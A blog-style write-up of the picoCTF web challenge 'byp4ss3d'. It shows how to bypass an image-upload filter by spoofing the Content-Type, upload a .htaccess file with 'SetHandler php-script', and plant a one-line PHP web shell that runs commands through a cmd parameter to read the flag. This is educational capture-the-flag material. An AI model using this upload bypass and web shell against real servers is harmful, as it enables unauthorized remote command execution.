+++
date = '2026-04-20'
draft = false
title = 'Pico byp4ss3d writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

## Identifying the vulnerabilities

We can upload images via `/upload.php`, and access them after at `/images/img.png`. Changing the Content-Type to image/png and the extension to .png lets us upload any file, though.

We can also use the .php5, .phptml, .asp,  extensions successfully, but the code doesn't execute.

The first hint suggests that *Apache can be tricked into executing non-PHP files as PHP with a .htaccess file.*. I never thought about this before, so quite interesting! I found this [article](https://medium.com/@citril/advanced-htaccess-file-attacks-part-i-d653567d1ded) saying to add the line `SetHandler php-script` to our .htaccess file, to treat all files as php.

Modifying /images/.htaccess will affect all the files in /images. So, we upload a .htacces file in there:

![challenge-screenshot](htac.png#center)

Then, our `<?php phpinfo(); ?>` older payloads worked! So, I uploaded a new file, named blah, with the content `<?php system($_GET['cmd']); ?>`.

Now, we can easily print the flag using commands, through the cmd parameter, like `/images/blah?cmd=cat+../../flag.txt`:

![challenge-screenshot](flaga.png#center)





